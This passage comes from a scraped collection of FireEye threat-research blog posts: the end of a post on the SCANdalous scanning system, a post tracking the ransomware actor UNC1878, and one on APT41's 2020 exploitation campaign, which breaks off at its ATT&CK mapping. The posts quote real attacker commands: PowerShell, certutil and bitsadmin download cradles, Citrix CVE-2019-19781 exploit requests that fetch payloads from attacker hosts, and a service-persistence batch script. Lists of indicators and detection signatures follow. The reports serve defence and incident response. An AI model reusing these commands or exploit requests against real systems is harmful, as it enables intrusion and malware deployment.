dozens of named malware families and threat groups. Since its inception, SCANdalous has produced over two million hits. Every single one of those, a piece of contextualized data that helps our team make analytical decisions. Of course, raw volume isn’t everything, so let’s dive a little deeper. When an analyst discovers that an IP address has been used by an adversary against a named organization, they denote that usage in our knowledge store. While the time at which this observation occurs does not always correlate with when it was used in an intrusion, knowing when we became aware of that use is still valuable. We can cross-reference these times with data from SCANdalous to help us understand the impact of our external detection. Looking at the IP addresses marked by an analyst as observed at a client in the last year, we find that 21.7% (more than one in five) were also found by SCANdalous. Of that fifth, SCANdalous has an average lead time of 47 days. If we only consider the IP addresses that SCANdalous found first, the average lead time jumps to 106 days. Going even deeper and examining this data month-to-month, we find a steady upward trend in the percentage of IP addresses identified by SCANdalous before being observed at a client (Figure 3). Figure 3: Percentage of IP addresses found by SCANdalous before being marked as observed at a client by a FireEye analyst A similar pattern can be seen for SCANdalous’ average lead time over the same data (Figure 4). Figure 4: Average lead time in days for SCANdalous over the same data shown in Figure 3 As we continue to create signatures and increase our external detection efforts, we can see from these numbers that the effectiveness and value of the resulting data grow as well. SCANdalous Case Studies Today in Advanced Practices, SCANdalous is a core element of our external detection work. It has provided us with a new lens through which we can observe threat activity on a scale and scope beyond our organic data, and enriches our workflows in support of Mandiant. Here are a few of our favorite examples: FIN6 In early 2019, SCANdalous identified a Cobalt Strike C2 server that we were able to associate with FIN6. Four hours later, the server was used to target a Managed Defense client, as discussed in our blog post, Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware . FIN7 In late 2019, SCANdalous identified a BOOSTWRITE C2 server and automatically acquired keying material that was later used to decrypt files found in a FIN7 intrusion worked by Mandiant consultants, as discussed in our blog post, Mahalo FIN7: Responding to the Criminal Operators’ New Tools and Techniques . UNC1878 (financially motivated) Some of you may also remember our recent blog post on UNC1878 . It serves as a great case study for how we grow an initial observation into a larger set of data, and then use that knowledge to find more activity across our offerings. Much of the early work that went into tracking that activity (see the section titled “Expansion”) happened via SCANdalous. The quick response from Managed Defense gave us just enough information to build a profile of the C2 and let our automated system take it from there. Over the next couple months, SCANdalous identified numerous servers matching UNC1878’s profile. This allowed us to not only analyze and attribute new network infrastructure, it also helped us observe when and how they were changing their operations over time. Conclusion There are hundreds more stories to tell, but the point is the same. When we find value in an analytical workflow, we ask ourselves how we can do it better and faster. The automation we build into our tools allows us to not only accomplish more of the work we were doing manually, it enables us to work on things we never could before. Of course, the conversion doesn’t happen all at once. Like all good things, we made a lot of incremental improvements over time to get where we are today, and we’re still finding ways to make more. Continuing to innovate is how we keep moving forward – as Advanced Practices, as FireEye, and as an industry. Example Signatures The following are example Shodan queries; however, any source of scan data can be used. Used to Identify APT39 C2 Servers product:“bitvise” port:“443” org:“WorldStream B.V.” Used to Identify QUADAGENT C2 Servers “PHP/7.2.0beta2” RULER.HOMEPAGE Payloads html:“clsid:0006F063-0000-0000-C000-000000000046” Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-03-31",
                    "source": "www.fireeye.com"
                },
                "text": "When we discover new intrusions, we ask ourselves questions that will help us understand the totality of the activity set. How common is this activity? Is there anything unique or special about this malware or campaign? What is new and what is old in terms of TTPs or infrastructure? Is this being seen anywhere else? What information do I have that substantiates the nature of this threat actor? To track a fast-moving adversary over time, we exploit organic intrusion data, pivot to other data sets, and make that knowledge actionable for analysts and incident responders, enabling new discoveries and assessments on the actor. The FireEye Advanced Practices team exists to know more about the adversary than anyone else, and by asking and answering questions such as these, we enable analyst action in security efforts. In this blog post, we highlight how our cycle of identification, expansion, and discovery was used to track a financially motivated actor across FireEye’s global data sets. Identification On January 29, 2020, FireEye Managed Defense investigated multiple TRICKBOT deployments against a U.S. based client. Shortly after initial deployment, TRICKBOT’s networkDll module ran the following network reconnaissance commands (Figure 1). ipconfig /all net config workstation net view /all net view /all /domain nltest /domain_trusts nltest /domain_trusts /all_trusts Figure 1: Initial Reconnaissance Approximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike HTTPS BEACON stager in memory (Figure 2). cmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))” Figure 2: PowerShell download cradle used to request a Cobalt Strike stager Six minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant. Managed Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks. A delta of approximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the clever masquerade domain, warranted further examination by our team. Although light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878. At the time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed Defense. By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to expand our understanding of this group and track their activity over time. This is especially important when dealing with campaigns involving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging. For more information on our clustering methodology, check out our post about how we analyze, separate, or merge these clusters at scale . Expansion Pivoting on the command and control (C2) domain allowed us to begin building a profile of UNC1878 network infrastructure. WHOIS records for cylenceprotect[.]com (Figure 3) revealed that the domain was registered on January 27, 2020, with the registrar \"Hosting Concepts B.V. d/b/a Openprovider\", less than two days before we saw this domain used in activity impacting the Managed Defense customer. Domain Name: cylenceprotect.com Registry Domain ID: 2485487352_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.registrar.eu Registrar URL: http://www.registrar.eu Updated Date: 2020-01-28T00:35:43Z Creation Date: 2020-01-27T23:32:18Z Registrar Registration Expiration Date: 2021-01-27T23:32:18Z Registrar: Hosting Concepts B.V. d/b/a Openprovider Figure 3: WHOIS record for the domain cylenceprotect[.]com Turning our attention to the server, the domain resolved to 45.76.20.140, an IP address owned by the VPS provider Choopa. In addition, the domain used self-hosted name servers ns1.cylenceprotect[.]com and ns2.cylenceprotect[.]com, which also resolved to the Choopa IP address. Network scan data for the server uncovered a certificate on port 80 and 443, a snippet of which can be seen in Figure 4. Certificate: Data: Version: 3 (0x2) Serial Number: 03:a8:60:02:c7:dd:7f:88:5f:2d:86:0d:88:41:e5:3e:25:f0 Signature Algorithm: sha256WithRSAEncryption Issuer: C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3 Validity Not Before: Jan 28 02:02:14 2020 GMT Not After : Apr 27 02:02:14 2020 GMT Subject: CN=cylenceprotect[.]com Figure 4: TLS Certificate for the domain cylenceprotect[.]com The certificate was issued by Let’s Encrypt, with the earliest validity date within 24 hours of the activity detected by Managed Defense, substantiating the speed in which this threat actor operates. Along with the certificate in Figure 4, we also identified the default generated, self-signed Cobalt Strike certificate (Figure 5) on port 54546 (50050 by default). Certificate: Data: Version: 3 (0x2) Serial Number: 1843990795 (0x6de9110b) Signature Algorithm: sha256WithRSAEncryption Issuer: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike Validity Not Before: Jan 28 03:06:30 2020 GMT Not After : Apr 27 03:06:30 2020 GMT Subject: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike Figure 5: Default Cobalt Strike TLS Certificate used by UNC1878 Similar to the certificate on port 80 and 443, the earliest validity date was again within 24 hours of the intrusion identified by Managed Defense. Continuing analysis on the server, we acquired the BEACON stager and subsequent BEACON payload, which was configured to use the Amazon malleable C2 profile . While these indicators may not hold significant weight on their own, together they create a recognizable pattern to fuel proactive discovery of related infrastructure. We began hunting for servers that exhibited the same characteristics as those used by UNC1878. Using third-party scan data, we quickly identified additional servers that matched a preponderance of UNC1878 tradecraft: Domains typically comprised of generic IT or security related terms such as “update”, “system”, and “service”. Domains registered with “Hosting Concepts B.V. d/b/a Openprovider\" as early as December 19, 2019. Self-hosted name servers. Let’s Encrypt certificates on port 80. Virtual private servers hosted predominantly by Choopa. BEACON payloads configured with the Amazon malleable C2 profile. Cobalt Strike Teams Servers on non-standard ports. Along with certificates matching UNC1878 tradecraft, we also found self-signed Armitage certificates, indicating this group may use multiple offensive security tools. Pivoting on limited indicators extracted from a single Managed Defense intrusion, a small cluster of activity was expanded into a more diverse set of indicators cardinal to UNC1878. While the objective and goal of this threat actor had not yet manifested, the correlation of infrastructure allowed our team to recognize this threat actor’s operations against other customers. Discovery With an established modus operandi for UNC1878, our team quickly identified several related intrusions in support of FireEye Mandiant investigations over the next week. Within two days of our initial clustering and expansion of UNC1878 from the original Managed Defense investigation, Mandiant Incident Responders were investigating activity at a U.S. based medical equipment company with several indicators we had previously identified and attributed to UNC1878. Attributed domains, payloads and methodologies provided consultants with a baseline to build detections on, as well as a level of confidence in the actor’s capabilities and speed in which they operate. Three days later, UNC1878 was identified during another incident response engagement at a restaurant chain. In this engagement, Mandiant consultants found evidence of attempted deployment of RYUK ransomware on hundreds of systems, finally revealing UNC1878’s desired end goal. In the following weeks, we continued to encounter UNC1878 in various phases of their intrusions at several Mandiant Incident Response and Managed Defense customers. While services data offers us a depth of understanding into these intrusions, we turn to our product telemetry to understand the breadth of activity, getting a better worldview and perspective on the global prevalence of this threat actor. This led to the discovery of an UNC1878 intrusion at a technology company, resulting in Mandiant immediately notifying the affected customer. By correlating multiple UNC1878 intrusions across our services and product customers, it became evident that the targeting was indiscriminate, a common characteristic of opportunistic ransomware campaigns. Although initially there were unanswered questions surrounding UNC1878’s intent, we were able to provide valuable insights into their capabilities to our consultants and analysts. In turn, the intrusion data gathered during these engagements continued the cycle of building our understanding of UNC1878’s tradecraft, enabling our responders to handle these incidents swiftly in the face of imminent ransomware deployment. Conclusion Threat actors continue to use mass malware campaigns to establish footholds into target environments, followed by interactive operations focused on deploying ransomware such as RYUK, DOPPLEPAYMER and MAZE. Looking at the overall trend of intrusions FireEye responds to, the growing shift from traditional PCI theft to ransomware has allowed threat actors such as UNC1878 to widen their scope and increase their tempo, costing organizations millions of dollars due to business disruption and ransom payments. However, apart from their speed, UNC1878 does not stand out among the increasing number of groups following this trend, and should not be the key takeaway of this blog post. The cycle of analysis and discovery used for UNC1878 lies at the core of our team’s mission to rapidly detect and pursue impactful adversaries at scale. Starting from a singular intrusion at a Managed Defense client, we were able to discover UNC1878 activity at multiple customers. Using our analysis of the early stages of their activity allowed us to pivot and pursue this actor across otherwise unrelated investigations. As we refine and expand our understanding of UNC1878’s tradecraft, our team enables Mandiant and Managed Defense to efficiently identify, respond to, and eradicate a financially motivated threat actor whose end goal could cripple targeted organizations. The principles applied in pursuit of this actor are crucial to tracking any adversary and are ultimately how the Advanced Practices team surfaces meaningful activity across the FireEye ecosystem. Acknowledgements Thank you to Andrew Thompson, Dan Perez, Steve Miller, John Gorman and Brendan McKeague for technical review of this content. In addition, thank you to the frontline responders harvesting valuable intrusion data that enables our research. Indicators of Compromise Domains aaatus[.]com avrenew[.]com besttus[.]com bigtus[.]com brainschampions[.]com checkwinupdate[.]com ciscocheckapi[.]com cleardefencewin[.]com cmdupdatewin[.]com comssite[.]com conhostservice[.]com cylenceprotect[.]com defenswin[.]com easytus[.]com findtus[.]com firsttus[.]com freeallsafe[.]com freeoldsafe[.]com greattus[.]com havesetup[.]net iexploreservice[.]com jomamba[.]best livecheckpointsrs[.]com livetus[.]com lsassupdate[.]com lsasswininfo[.]com microsoftupdateswin[.]com myservicebooster[.]com myservicebooster[.]net myserviceconnect[.]net myserviceupdater[.]com myyserviceupdater[.]com renovatesystem[.]com service-updater[.]com servicesbooster[.]com servicesbooster[.]org servicesecurity[.]org serviceshelpers[.]com serviceupdates[.]net serviceuphelper[.]com sophosdefence[.]com target-support[.]online taskshedulewin[.]com timesshifts[.]com topsecurityservice[.]net topservicehelper[.]com topservicesbooster[.]com topservicesecurity[.]com topservicesecurity[.]net topservicesecurity[.]org topservicesupdate[.]com topservicesupdates[.]com topserviceupdater[.]com update-wind[.]com updatemanagir[.]us updatewinlsass[.]com updatewinsoftr[.]com web-analysis[.]live windefenceinfo[.]com windefens[.]com winsysteminfo[.]com winsystemupdate[.]com worldtus[.]com yoursuperservice[.]com IP Addresses 31.7.59.141 45.32.30.162 45.32.130.5 45.32.161.213 45.32.170.9 45.63.8.219 45.63.95.187 45.76.20.140 45.76.167.35 45.76.231.195 45.77.58.172 45.77.89.31 45.77.98.157 45.77.119.212 45.77.153.72 45.77.206.105 63.209.33.131 66.42.97.225 66.42.99.79 79.124.60.117 80.240.18.106 81.17.25.210 95.179.147.215 95.179.210.8 95.179.215.228 96.30.192.141 96.30.193.57 104.156.227.250 104.156.245.0 104.156.250.132 104.156.255.79 104.238.140.239 104.238.190.126 108.61.72.29 108.61.90.90 108.61.176.237 108.61.209.123 108.61.242.184 140.82.5.67 140.82.10.222 140.82.27.146 140.82.60.155 144.202.12.197 144.202.83.4 149.28.15.247 149.28.35.35 149.28.50.31 149.28.55.197 149.28.81.19 149.28.113.9 149.28.122.130 149.28.246.25 149.248.5.240 149.248.56.113 149.248.58.11 151.106.56.223 155.138.135.182 155.138.214.247 155.138.216.133 155.138.224.221 207.148.8.61 207.148.15.31 207.148.21.17 207.246.67.70 209.222.108.106 209.250.255.172 216.155.157.249 217.69.15.175 BEACON Staging URLs hxxp://104.156.255[.]79:80/avbcbgfyhunjmkmk hxxp://149.28.50[.]31:80/adsrxdfcffdxfdsgfxzxds hxxp://149.28.81[.]19:80/ajdlkashduiqwhuyeu12312g3yugshdahqjwgye1g2uy31u1 hxxp://45.32.161[.]213:80/ephfusaybuzabegaexbkakskjfgksajgbgfckskfnrdgnkhdsnkghdrngkhrsngrhgcngyggfxbgufgenwfxwgfeuyenfgx hxxp://45.63.8[.]219:80/ajhgfrtyujhytr567uhgfrt6y789ijhg hxxp://66.42.97[.]225:80/aqedfy345yu9876red45f6g78j90 hxxp://findtus[.]com/akkhujhbjcjcjhufuuljlvu hxxp://thedemocraticpost[.]com/kflmgkkjdfkmkfl hxxps://brainschampions[.]com:443/atrsgrtehgsetrh5ge hxxps://ciscocheckapi[.]com:80/adsgsergesrtvfdvsa hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt hxxps://havesetup[.]net/afgthyjuhtgrfety hxxps://servicesbooster[.]org:443/sfer4f54 hxxps://servicesecurity[.]org:443/fuhvbjk hxxps://timesshifts[.]com:443/akjhtyrdtfyguhiugyft hxxps://timesshifts[.]com:443/ry56rt6yh5rth hxxps://update-wind[.]com/aergerhgrhgeradgerg hxxps://updatemanagir[.]us:80/afvSfaewfsdZFAesf Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-03-25",
                    "source": "www.fireeye.com"
                },
                "text": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC , Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature. Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC]) Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019). Figure 1: Timeline of key events The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step. One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet. POST /vpns/portal/scripts/newbm.pl HTTP/1.1 Host: [redacted] Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.22.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/[redacted] Content-Length: 96 url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %] Figure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781 There is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well. Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor). POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Accept-Encoding: identity Content-Length: 147 Connection: close Nsc_User: ../../../netscaler/portal/templates/[redacted] User-Agent: Python-urllib/2.7 Nsc_Nonce: nsroot Host: [redacted] Content-Type: application/x-www-form-urlencoded url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = ' print `/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd `') %] Figure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781 We did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed. POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Accept-Encoding: identity Content-Length: 145 Connection: close Nsc_User: ../../../netscaler/portal/templates/[redacted] User-Agent: Python-urllib/2.7 Nsc_Nonce: nsroot Host: [redacted] Content-Type: application/x-www-form-urlencoded url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = ' print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un `') %] Figure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781 Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP. Cisco Router Exploitation On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s ( CVE-2019-1653 and CVE-2019-1652 ) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload. GET /test/fuc HTTP/1.1 Host: 66.42.98\\.220 User-Agent: Wget Connection: close Figure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget 66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5:  c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration. Cisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action: Cisco Small Business RV320 and RV325 Routers Information Disclosure Vulnerability Cisco Small Business RV320 and RV325 Routers Command Injection Vulnerability Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability) On March 5, 2020, researcher Steven Seeley , published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 ( CVE-2020-10189) . Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll. java/lang/Runtime getRuntime ()Ljava/lang/Runtime; Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\ Windows\\Temp\\install.bat')&powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll',' C:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat '(Ljava/lang/String;)Ljava/lang/Process; StackMapTable ysoserial/Pwner76328858520609 Lysoserial/Pwner76328858520609; Figure 6: Contents of logger.zip Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation. In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345. Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe Process Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat Figure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation In both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f). @echo off set \"WORK_DIR=C:\\Windows\\System32\" set \"DLL_NAME=storesyncsvc.dll\" set \"SERVICE_NAME=StorSyncSvc\" set \"DISPLAY_NAME=Storage Sync Service\" set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\" sc stop %SERVICE_NAME% sc delete %SERVICE_NAME% mkdir %WORK_DIR% copy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Y reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /t REG_MULTI_SZ /d \"%SERVICE_NAME%\" /f sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\" SC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000 sc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\" reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /f net start \"%SERVICE_NAME%\" Figure 8: Contents of install.bat Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile. GET /jquery-3.3.1.min.js HTTP/1.1 Host: cdn.bootcss.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://cdn.bootcss.com/ Accept-Encoding: gzip, deflate Cookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM DA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko Connection: Keep-Alive Cache-Control: no-cache Figure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions , which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit. GET /2.exe HTTP/1.1 Cache-Control: no-cache Connection: Keep-Alive Pragma: no-cache Accept: */* User-Agent: Microsoft-CryptoAPI/6.3 Host: 91.208.184[.]78 Figure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader via CertUtil certutil  -urlcache -split -f http://91.208.184[.]78/2.exe Figure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloader The Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version). GET /TzGG HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0) Host: 91.208.184[.]78:443 Connection: Keep-Alive Cache-Control: no-cache Figure 12: Example HTTP request downloading ‘TzGG’ shellcode for Cobalt Strike BEACON The downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems. ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an update on March 7, 2020, with a long term fix. Outlook This activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers , and seems to reveal a high operational tempo and wide collection requirements for APT41. It is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage. Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain. Indicators Type Indicator(s) CVE-2019-19781 Exploitation (Citrix Application Delivery Control) 66.42.98[.]220 CVE-2019-19781 exploitation attempts with a payload of ‘file /bin/pwd’ CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/bsd’ CVE-2019-19781 exploitation attempts with a payload of ‘/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un’ /tmp/bsd /tmp/un Cisco Router Exploitation 66.42.98\\.220 ‘1.txt’ (MD5:  c0c467c8e9b2046d7053642cc9bdd57d) ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc CVE-2020-10189 (Zoho ManageEngine Desktop Central) 66.42.98[.]220 91.208.184[.]78 74.82.201[.]8 exchange.dumb1[.]com install.bat (MD5: 7966c2c546b71e800397a67f942858d0) storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f) C:\\Windows\\Temp\\storesyncsvc.dll C:\\Windows\\Temp\\install.bat 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c) C:\\Users\\[redacted]\\install.bat TzGG (MD5: 659bd19b562059f3f0cc978e15624fd9) C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe spawning cmd.exe and/or bitsadmin.exe Certutil.exe downloading 2.exe and/or payloads from 91.208.184[.]78 PowerShell downloading files with Net.WebClient Detecting the Techniques FireEye detects this activity across our platforms. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring. Platform Signature Name Endpoint Security BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY) CERTUTIL.EXE DOWNLOADER A (UTILITY) Generic.mg.5909983db4d9023e Generic.mg.3e856162c36b5329 POWERSHELL DOWNLOADER (METHODOLOGY) SUSPICIOUS BITSADMIN USAGE B (METHODOLOGY) SAMWELL (BACKDOOR) SUSPICIOUS CODE EXECUTION FROM ZOHO MANAGE ENGINE (EXPLOIT) Network Security Backdoor.Meterpreter DTI.Callback Exploit.CitrixNetScaler Trojan.METASTAGE Exploit.ZohoManageEngine.CVE-2020-10198.Pwner Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader Helix CITRIX ADC [Suspicious Commands] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt] EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success] EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access] EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning] MALWARE METHODOLOGY [Certutil User-Agent] WINDOWS METHODOLOGY [BITSadmin Transfer] WINDOWS METHODOLOGY [Certutil Downloader] MITRE ATT&CK Technique Mapping ATT&CK Techniques Initial Access 